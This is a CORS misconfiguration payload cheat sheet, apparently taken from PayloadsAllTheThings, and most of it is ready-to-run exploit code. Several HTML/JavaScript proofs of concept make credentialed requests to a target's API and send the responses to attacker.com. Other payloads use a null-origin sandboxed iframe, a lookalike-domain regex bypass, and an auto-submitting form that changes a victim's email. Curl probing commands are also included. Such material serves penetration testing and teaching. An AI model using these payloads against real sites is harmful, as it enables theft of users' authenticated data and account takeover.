# CORS Misconfiguration Payloads

> Source: PayloadsAllTheThings — CORS Misconfiguration

## Detection

Check if the server reflects the Origin header:

```bash
curl -s -I -H "Origin: https://evil.com" https://target.com/api/user | grep -i "access-control"
```

Vulnerable response:

```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

## Null Origin Bypass

Server allows `Origin: null` with credentials. Use a sandboxed iframe to send requests with null origin.

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
      location = 'https://attacker.com/log?data=' + encodeURIComponent(this.responseText);
    };
    req.open('GET', 'https://target.com/api/sensitive', true);
    req.withCredentials = true;
    req.send();
  </script>">
</iframe>
```

## Origin Reflection (Wildcard Credential Theft)

Server reflects any Origin header back and allows credentials.

```html
<script>
var req = new XMLHttpRequest();
req.onload = function() {
  // Exfiltrate stolen data
  fetch('https://attacker.com/log', {
    method: 'POST',
    body: this.responseText
  });
};
req.open('GET', 'https://target.com/api/sensitive', true);
req.withCredentials = true;
req.send();
</script>
```

## Subdomain Wildcard / Regex Bypass

Server trusts `*.target.com` — exploit XSS on any subdomain, or register a lookalike domain if regex is weak.

### Unescaped Dot in Regex

If server validates `^api.target.com$` (unescaped dot), register `apiatarget.com`:

```html
<!-- Hosted on apiatarget.com -->
<script>
var req = new XMLHttpRequest();
req.onload = function() {
  location = 'https://attacker.com/log?data=' + encodeURIComponent(this.responseText);
};
req.open('GET', 'https://api.target.com/api/sensitive', true);
req.withCredentials = true;
req.send();
</script>
```

### Prefix/Suffix Matching Bypass

If server checks `endswith("target.com")`:

```
Origin: https://evil-target.com     -> may be accepted
Origin: https://attackertarget.com  -> may be accepted
```

## Pre-flight Bypass

Simple requests (GET, POST with standard Content-Type) skip pre-flight OPTIONS check:

```html
<!-- No pre-flight needed for simple requests -->
<form action="https://target.com/api/change-email" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

## Full Credential Stealing PoC

```html
<!DOCTYPE html>
<html>
<body>
  <h2>CORS Exploitation PoC</h2>
  <div id="result"></div>
  <script>
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
        document.getElementById("result").innerText = this.responseText;
        // Exfiltrate
        var exfil = new XMLHttpRequest();
        exfil.open("POST", "https://attacker.com/collect", true);
        exfil.send(this.responseText);
      }
    };
    xhr.open("GET", "https://target.com/api/me", true);
    xhr.withCredentials = true;
    xhr.send();
  </script>
</body>
</html>
```

## Common CORS Misconfigurations

| Misconfiguration | Risk |
|-----------------|------|
| `Access-Control-Allow-Origin: *` with credentials | Browser blocks, but data still exposed to scripts |
| Origin reflection with `Allow-Credentials: true` | Full credential theft |
| `null` origin allowed with credentials | Sandbox iframe exploitation |
| Regex bypass (unescaped dot, prefix match) | Domain spoofing |
| Trusting all subdomains | XSS on any subdomain = full CORS bypass |

## Curl Testing Commands

```bash
# Test origin reflection
curl -s -H "Origin: https://evil.com" https://target.com/api/ -I

# Test null origin
curl -s -H "Origin: null" https://target.com/api/ -I

# Test subdomain trust
curl -s -H "Origin: https://anything.target.com" https://target.com/api/ -I

# Test prefix bypass
curl -s -H "Origin: https://target.com.evil.com" https://target.com/api/ -I
```
